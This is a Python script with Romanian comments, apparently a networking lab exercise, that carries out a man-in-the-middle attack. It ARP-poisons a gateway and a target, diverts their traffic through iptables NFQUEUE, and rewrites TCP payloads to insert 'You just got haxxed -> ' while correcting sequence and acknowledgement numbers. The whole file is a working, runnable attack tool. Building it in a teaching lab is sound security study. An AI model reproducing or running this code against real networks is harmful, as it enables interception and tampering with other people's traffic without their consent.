from scapy.all import ARP, TCP, send, sr, IP, Raw
import os
import sys
import threading
import time
from netfilterqueue import NetfilterQueue as NFQ

# constante si variabile globale -------------------------------------------------------------------------------------------
CLIENT_IP = '172.10.0.2'
SERVER_IP = '198.10.0.2'

seq_nr_mask = dict()
seq_nr_unmask = dict()

#ARP Poison parameters
gateway_ip = "198.10.0.1"
target_ip = "198.10.0.2"
packet_count = 1000

# lungime 23
HACK_MESSAGE = b'You just got haxxed -> '

# Gata constante si variabile globale -------------------------------------------------------------------------------------

# Functie care primeste un IP, si trimite face broadcast unui pachet de tip ARP pentru
# a aflat adresa MAC a adresei respective. Returneaza adresa MAC respectiva, sau None
# daca ia timeout request-ul
def get_mac(ip_address):
    # Construim pachetul ARP, cu codul de operatie 1 (who-has)
    # si folosim functia sr (Send and Receive) pentru a trimite request-ul si a astepta raspunsul
    response, _ = sr(ARP(op=1, pdst=ip_address), retry=2, timeout=10)
    for _, packet in response:
        return packet[ARP].hwsrc
    return None

# Restabilim reteaua prin faptul ca facem broadcast cu pachete cu opcode = 2 (is-at)
# cu adresele MAC reale pentru gateway si target (server in cazul nostru)
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op = 2, pdst = gateway_ip, hwsrc = target_mac, psrc = target_ip), count = 5)
    send(ARP(op = 2, pdst = target_ip, hwsrc = gateway_mac, psrc = gateway_ip), count = 5)

# Un loop infinit care face broadcast unui pachet care sa amageasca reteaua in legatura cu adresa MAC
# a router-ului, si a unui pachet care sa amageasca reteaua in legatura cu adresa MAC a target-ului
def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Am pornit atacul de tip ARP poison [CTRL-C pentru a opri]")
    try:
        while True:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Oprim atacul de ARP Poison. Restabilim reteaua...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

def alter_packet(packet):
    '''Implementați asta ca exercițiu.
    # !atentie, trebuie re-calculate campurile len si checksum
    '''
    global seq_nr_mask, seq_nr_unmask

    new_seq_nr = packet[TCP].seq
    if new_seq_nr in seq_nr_mask:
        new_seq_nr = seq_nr_mask[new_seq_nr]
    
    new_ack_nr = packet[TCP].ack
    if new_ack_nr in seq_nr_unmask:
        new_ack_nr = seq_nr_unmask[new_ack_nr]

    if packet.haslayer(Raw):
        current_len = len(packet[Raw].load)
        total_len = current_len + len(HACK_MESSAGE)

        seq_nr_mask[packet[TCP].seq + current_len] = new_seq_nr + total_len
        seq_nr_unmask[new_seq_nr + total_len] = packet[TCP].seq + current_len

        new_packet = IP(
            src = packet[IP].src,
            dst = packet[IP].dst
        ) / TCP (
            seq = new_seq_nr,
            ack = new_ack_nr,
            sport = packet[TCP].sport,
            dport = packet[TCP].dport,
            flags = packet[TCP].flags
        ) / (HACK_MESSAGE + packet[Raw].load)

        print('Pachet dupa:')
        new_packet.show2()

        send(new_packet)
        return
    
    new_packet = IP(
            src = packet[IP].src,
            dst = packet[IP].dst
        ) / TCP (
            seq = new_seq_nr,
            ack = new_ack_nr,
            sport = packet[TCP].sport,
            dport = packet[TCP].dport,
            flags = packet[TCP].flags
        )
    
    print('Pachet dupa:')
    new_packet.show2()
        
    send(new_packet)
    return


def process(packet):
    octeti = packet.get_payload()
    scapy_packet = IP(octeti)

    if not scapy_packet.haslayer(TCP):
        packet.accept()
        return

    print("Pachet initial:")
    scapy_packet.show2()
    alter_packet(scapy_packet)

if __name__ == '__main__':
    print("[*] Porneste script-ul...")

    print(f"[*] Gateway IP address: {gateway_ip}")
    print(f"[*] Target IP address: {target_ip}")

    gateway_mac = get_mac(gateway_ip)
    if gateway_mac is None:
        print("[!] Nu putem afla adresa MAC a gateway. Inchidem...")
        sys.exit(0)
    else:
        print(f"[*] Gateway MAC address: {gateway_mac}")

    target_mac = get_mac(target_ip)
    if target_mac is None:
        print("[!] Nu putem afla adresa MAC a target. Inchidem...")
        sys.exit(0)
    else:
        print(f"[*] Target MAC address: {target_mac}")

    # Pornim un thread separat care sa se ocupe de interpunerea intre target si gateway
    poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
    poison_thread.start()


    queue = NFQ()

    # Captam pachetele ce trec prin placa noastra de retea, si le scriem intr-un fisier.
    try:
        sniff_filter = "ip host " + target_ip
        print(f"[*] Pornim captarea pachetelor pe placa de retea. Packet Count: {packet_count}. Filter: {sniff_filter}")

        print(f"[*] Stopping network capture..Restoring network")
        os.system("iptables -I INPUT -j NFQUEUE --queue-num 5")
        os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 5")
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 5")
        queue.bind(5, process)
        queue.run()
        os.system('iptables -D FORWARD 1')
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        print(f"[*] Oprim captarea pachetelor. Restabilim reteaua...")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        os.system('iptables -D FORWARD 1')
        queue.unbind()
        sys.exit(0)